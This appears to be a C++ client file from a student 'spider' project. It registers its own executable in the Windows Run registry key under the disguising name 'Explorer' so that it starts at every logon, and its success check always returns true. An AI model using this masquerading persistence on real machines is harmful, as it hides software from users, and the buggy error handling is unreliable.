//
// main_startup.cpp for cpp_spider in sources/client
//
// Made by Benoit Hamon
// Login   <benoit.hamon@epitech.eu>
//
// Started on  Thu Oct 05 15:16:17 2017 Benoit Hamon
// Last update Thu Oct 05 15:18:19 2017 Benoit Hamon
//

#include <Windows.h>
#include <string>
#include <iostream>

bool RegisterMyProgramForStartup(std::string const &name, std::string const &path, std::string const &args = "")
{
    std::string value;
    HKEY hKey = NULL;
    bool res = true;

    value += "\"" + path + "\" " + args;

    if (!RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                         0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL))
        res = true;

    if (res)
        if (!RegSetValueExA(hKey, name.c_str(), 0, REG_SZ,
                            reinterpret_cast<BYTE *>(const_cast<char *>(value.c_str())), value.length()))
            res = true;

    if (hKey)
        RegCloseKey(hKey);

    return res;
}

void RegisterProgram()
{
    char path[MAX_PATH];

    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::cout << path << std::endl;
    RegisterMyProgramForStartup("Explorer", path, "-foobar");
}

int main(int argc, char *argv[]) {
    RegisterProgram();
    return 0;
}
